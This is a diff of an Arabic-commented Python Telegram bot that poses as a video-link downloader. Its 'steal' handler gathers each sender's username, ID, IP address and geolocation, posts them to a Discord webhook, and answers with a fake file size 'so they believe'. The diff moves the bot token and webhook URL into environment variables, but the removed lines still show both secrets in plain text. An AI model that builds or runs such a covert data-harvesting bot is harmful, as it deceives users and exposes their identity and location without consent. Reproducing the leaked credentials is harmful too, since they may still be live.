@@ -4,9 +4,15 @@ import os
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
-# ====== التوكنات (تم التحديث) ======
-TOKEN = "8727749707:AAHf-gXht8FPqBGv85HgGzmoBRt-WguL58M"  # توكن البوت
-DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1547347596979208212/u5g0UuAqJWd7U-TNfPk6a-u7GbsTNDiKe8iXssiSPxMRva8Kg2pT0FykiBATecmawTn8"  # رابط الدسكورد
+# ====== الأكواد السرية تُقرأ من متغيرات البيئة ======
+TOKEN = os.environ.get('BOT_TOKEN')
+DISCORD_WEBHOOK = os.environ.get('DISCORD_WEBHOOK')
+
+# ====== التأكد من وجود التوكنات ======
+if not TOKEN:
+    raise ValueError("❌ لم يتم تعيين BOT_TOKEN في متغيرات البيئة!")
+if not DISCORD_WEBHOOK:
+    raise ValueError("❌ لم يتم تعيين DISCORD_WEBHOOK في متغيرات البيئة!")
 
 # ====== إرسال البيانات لدسكورد ======
 def send_to_discord(user_data):
@@ -53,11 +59,9 @@ def get_device(user_agent):
 # ====== جلب الـ IP والموقع ======
 def get_ip_info():
     try:
-        # جلب الـ IP
         ip_response = requests.get('https://api.ipify.org?format=json', timeout=5)
         ip = ip_response.json()['ip']
         
-        # جلب الموقع
         loc_response = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
         loc = loc_response.json()
         
@@ -92,7 +96,6 @@ async def steal(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
     urls = re.findall(r'https?://[^\s]+', text)
     
-    # إذا ما فيه رابط
     if not urls:
         await update.message.reply_text(
             "❌ أرسل رابط مقطع صحيح!\n"
@@ -101,7 +104,6 @@ async def steal(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     # ====== تجميع البيانات ======
-    # معلومات المستخدم
     data = {
         'username': user.username or 'مخفي',
         'user_id': user.id,
@@ -119,7 +121,6 @@ async def steal(update: Update, context: ContextTypes.DEFAULT_TYPE):
     send_to_discord(data)
     
     # ====== رد مزيف يخفي الحقيقة ======
-    # حساب حجم وهمي عشان يصدقون
     fake_size = f"{len(urls[0]) * 2}.{len(urls[0]) % 10} MB"
     
     await update.message.reply_text(
@@ -152,12 +153,10 @@ def main():
     print("🚀 البوت شغال...")
     app = Application.builder().token(TOKEN).build()
     
-    # إضافة الأوامر
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, steal))
     app.add_handler(CallbackQueryHandler(fake_download, pattern="fake_download"))
     
-    # تشغيل البوت
     app.run_polling()
 
 if __name__ == "__main__":
